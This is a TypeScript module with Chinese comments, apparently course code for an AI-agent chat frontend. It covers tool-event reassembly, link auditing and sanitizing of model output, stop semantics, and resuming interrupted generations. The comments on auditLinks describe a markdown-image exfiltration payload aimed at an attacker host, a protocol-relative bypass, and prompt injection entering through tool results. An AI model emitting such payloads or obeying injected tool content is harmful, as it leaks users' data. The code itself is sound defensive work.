 *
 * 输出按 outputIndex 排序，和到达顺序无关。
 */
export function reassemble(events: RawToolEvent[]): Reassembled {
  // ★ 按全局 seq 排序，不按到达顺序。乱序到达是真实存在的。
  const sorted = [...events].sort((a, b) => a.seq - b.seq)

  interface Slot {
    outputIndex: number
    toolName: string
    j: JsonAccumulator
    deltas: number
  }
  const acc = new Map<string, Slot>()

  for (const e of sorted) {
    if (e.phase === 'start') {
      // ★ 同一个 itemId 收到两次 start 是协议违规，不要覆盖已完成的调用
      if (acc.has(e.itemId)) throw new Error(`同一个 itemId 收到两次 start：${e.itemId}`)
      acc.set(e.itemId, {
        outputIndex: e.outputIndex,
        toolName: e.toolName ?? '',
        j: new JsonAccumulator(),
        deltas: 0,
      })
      continue
    }

    const slot = acc.get(e.itemId)
    // ★ 找不到 slot 就抛错，不要静默新建——那正是「串味」bug 的藏身处
    if (!slot) throw new Error(`${e.phase} 事件找不到对应的 start：${e.itemId}`)

    if (e.phase === 'delta') {
      slot.j.push(e.delta ?? '')
      slot.deltas++
    } else {
      slot.j.close()
    }
  }

  const calls: ToolCall[] = []
  const modelBoundaries: number[] = []

  for (const [itemId, s] of acc) {
    // ★★ 零 delta 的块是模型边界，不是工具调用。见 Reassembled 的注释。
    if (s.deltas === 0) {
      modelBoundaries.push(s.outputIndex)
      continue
    }
    calls.push({
      itemId,
      outputIndex: s.outputIndex,
      toolName: s.toolName,
      args: s.j.get(),
    })
  }

  // 输出按 outputIndex 排序，和到达顺序无关
  calls.sort((a, b) => a.outputIndex - b.outputIndex)
  modelBoundaries.sort((a, b) => a - b)
  return { calls, modelBoundaries }
}

// ═══════════════════════════════════════════════════════════════════
// 七、渲染层安全：模型输出里的外链
// ═══════════════════════════════════════════════════════════════════

export interface LinkAudit {
  /** markdown 里出现的全部外部资源 URL。 */
  found: string[]
  /** 不在白名单里的那些。 */
  offending: string[]
}

/**
 * 扫出一段 markdown 里会**自动发起网络请求**的外链。
 *
 * ★★ 这一条是 L14 和 L15 在渲染层的交汇点，而它是本节唯一一处真正的安全边界。
 *
 * 一个 markdown 图片 `![](https://attacker/?q=<偷到的数据>)` 在界面上
 * 什么都不显示（或者只是一个碎图标），但浏览器**已经把数据发出去了**。
 * 不需要用户点击，渲染即发送。
 *
 * 这不是理论攻击。L14 那张表里五个厂商的「过滤」全被绕过过，
 * 包括一个带 HMAC 签名的图片代理。而 2026 年还有新的 CVE 是同一个形状。
 *
 * 所以这里的判定是**白名单**而不是黑名单，而且要包括参考式 markdown
 * （`![t][ref]` 配 `[ref]: url`）——那正是某次绕过用的形式。
 */
export function auditLinks(markdown: string, allowedHosts: string[]): LinkAudit {
  const found: string[] = []

  // 内联式图片：![alt](url)
  for (const m of markdown.matchAll(/!\[[^\]]*\]\(\s*([^)\s]+)/g)) found.push(m[1]!)
  // ★ 参考式图片：![alt][ref] + [ref]: url。漏掉这个形式的过滤器被真实绕过过。
  for (const m of markdown.matchAll(/^\s*\[[^\]]+\]:\s*(\S+)/gm)) found.push(m[1]!)
  // HTML img，markdown 渲染器通常默认允许内联 HTML
  for (const m of markdown.matchAll(/<img[^>]+src\s*=\s*["']?([^"'\s>]+)/gi)) found.push(m[1]!)

  const offending = found.filter((u) => {
    // ★★ 这一条必须排在「相对路径」判断**之前**。
    // `//evil.test/x` 是协议相对 URL，浏览器会照常发出去，
    // 而一个「以 / 开头就是站内路径」的判断会直接放过它。
    // 这就是本文件里唯一一处顺序写错就变成安全漏洞的地方。
    if (u.startsWith('//')) return true

    // 锚点、站内绝对/相对路径、data: 不产生外部请求
    if (/^(#|\/|\.|data:)/.test(u)) return false

    let host: string
    try {
      const parsed = new URL(u)
      // ★ mailto: 这类没有 host 的 scheme 也走不到白名单里，按违规处理
      host = parsed.hostname
      if (host === '') return true
    } catch {
      // ★ 解析不出来的当**违规**处理。「看不懂所以放过」是这门课反复出现的那个错。
      return true
    }
    return !allowedHosts.includes(host)
  })

  return { found, offending }
}

/**
 * 清理一段要渲染的内联内容。
 *
 * ★ 这个函数只做**两件**事，而且刻意不做第三件：它不是一个 HTML 消毒器。
 * 真要渲染富文本请用成熟的库（DOMPurify 之类）。这里存在的意义是把两个
 * 具体的、有真实案例的洞写成可断言的：
 *
 *   1. `javascript:` / `vbscript:` / `data:text/html` 这类 href
 *   2. 带事件处理器属性的内联 HTML（`onerror=`、`onload=` ……）
 *
 * ★★ 而第三件事才是重点：**工具结果要走同一条清理路径。**
 * 很容易只清理「模型说的话」而放过「工具返回的内容」——但工具结果同样
 * 来自外部（文件内容、网页、别人的 API），L14 讲的注入正是从那里进来的。
 */
export function sanitizeInline(s: string): string {
  return (
    s
      // 危险 scheme 的链接：保留文字，去掉 href
      .replace(/\]\(\s*(javascript|vbscript|data:text\/html)[^)]*\)/gi, '](#blocked)')
      // 事件处理器属性。★ 属性名允许带连字符和冒号，别用 \w+
      .replace(/\son[a-z-]+\s*=\s*("[^"]*"|'[^']*'|[^\s>]+)/gi, '')
      // <script>…</script>，连内容一起去掉
      .replace(/<script\b[^>]*>[\s\S]*?<\/script\s*>/gi, '')
  )
}

// ═══════════════════════════════════════════════════════════════════
// 七、中断的语义
// ═══════════════════════════════════════════════════════════════════

/**
 * 什么时候该调「停止生成」这个端点。
 *
 * ★★ 这个类存在的唯一理由是：**它的三个方法里有两个必须什么都不做。**
 *
 * 官方对这件事有非常明确的、而且反直觉的规定：
 *
 *   "Do not call the stop endpoint from route cleanup code"
 *   "page unloads … should remain resumable"
 *
 * 也就是说组件卸载、路由切换、页面关闭**都不应该**停止生成——
 * 那些流要保持可恢复。只有用户**显式**点停止才算。
 *
 * ★ 而这一条和一个 React 的本能正面冲突：useEffect 的清理函数里
 * abort 掉在途请求是标准做法（避免竞态和内存泄漏）。在 agent 前端里，
 * 这个标准做法会把用户花了钱的生成给掐掉，而且掐在他切了个 tab 的时候。
 *
 * 所以**「取消渲染」和「取消生成」必须是两个信号**。前者随便 abort，
 * 后者只认用户那一次点击。
 */
export class StopPolicy {
  /** 调用了几次停止端点。测试用。 */
  calls = 0
  private stopped = false

  /** 组件卸载 / 路由切换。★ 什么都不做。 */
  onUnmount(): void {}

  /** 页面 unload。★ 什么都不做——那条流要保持可恢复。 */
  onPageHide(): void {}

  /** 用户显式点了停止。★ 幂等：连点三次也只发一次。 */
  onUserStop(): void {
    if (this.stopped) return
    this.stopped = true
    this.calls++
  }
}

/**
 * 两个 signal 合流之后，怎么知道是谁触发的。
 *
 * ★ `AbortSignal.any([...])` 把多个来源合成一个，但下游只拿到一个 signal。
 * 区分靠 `signal.reason`——而这件事有实际后果：超时该重试，用户取消不该重试。
 * 一个只看「被 abort 了」的实现会在用户点停止之后**自动重试一次**。
 */
export function abortCause(signal: AbortSignal): 'user' | 'timeout' | 'other' | null {
  if (!signal.aborted) return null
  const r = signal.reason
  if (r instanceof Error && r.name === 'TimeoutError') return 'timeout'
  if (typeof r === 'string' && r.includes('user')) return 'user'
  return 'other'
}

export interface HistoryBlock {
  type: 'text' | 'thinking' | 'redacted_thinking' | 'tool_use'
  text?: string
  /** thinking 块才有。★ 必须逐字节原样回传，改一个字就是 400。 */
  signature?: string
}

export interface ResumeRequest {
  messages: { role: 'user' | 'assistant'; content: HistoryBlock[] }[]
  /** 实现为什么这么做。审计用。 */
  notes: string[]
}

/**
 * 中断之后，构造下一轮请求。
 *
 * ★★ 这个函数的主要工作是**不做**两件很自然的事：
 *
 *   1. 不把半截 assistant 消息放在末尾。
 *      prefill / 续写在 Claude 4.6 及以后**直接返回 400**，不是降级。
 *      恢复中断的流要改用一条 **user** 消息来表达。
 *
 *   2. 不过滤 thinking 块。
 *      它们必须逐字节原样回传，包括 signature 和 redacted_thinking。
 *      ★ 而 400 最常见的起因是一个前端标准操作：
 *      `messages.map(...)` 里按 type 过滤，把 thinking 块顺手滤掉了。
 *      这就是为什么这个函数**不接受**一个过滤器参数——那个口子一开，
 *      调用方迟早会用它把 thinking 滤掉。
 */
export function buildResumeRequest(
  history: { role: 'user' | 'assistant'; content: HistoryBlock[] }[],
  partial: View,
): ResumeRequest {
  const notes: string[] = []
  const messages = history.map((m) => ({
    role: m.role,
    // ★ 逐字节原样：不 map、不过滤、不重建块对象。
    content: m.content,
  }))
  notes.push('历史原样保留，thinking 块含 signature 未做任何改动')

  const check = checkResumable(partial)
  const kept =
    check.safeUpTo >= 0
      ? partial.parts
          .slice(0, check.safeUpTo + 1)
          .filter((p) => p.kind === 'text')
          .map((p) => p.text)
          .join('')
      : ''

  if (kept === '') {
    notes.push(`半截输出一个字都没带：${check.reason}`)
  } else {
    // ★★ 关键在这里：把已经拿到的内容放进一条 **user** 消息，而不是
    // 续在 assistant 消息后面。后者就是 prefill，会 400。
    messages.push({
      role: 'user',
      content: [
        {
          type: 'text',
          text: `上一次回答被中断了，已经收到的部分是：\n\n${kept}\n\n请从这里继续。`,
        },
      ],
    })
    notes.push('半截输出放进了一条 user 消息（不是 assistant 续写——那会 400）')
  }

  const last = messages[messages.length - 1]
  if (last?.role === 'assistant') {
    notes.push('★ 末尾是 assistant 消息，这个请求会被拒')
  }
  return { messages, notes }
}
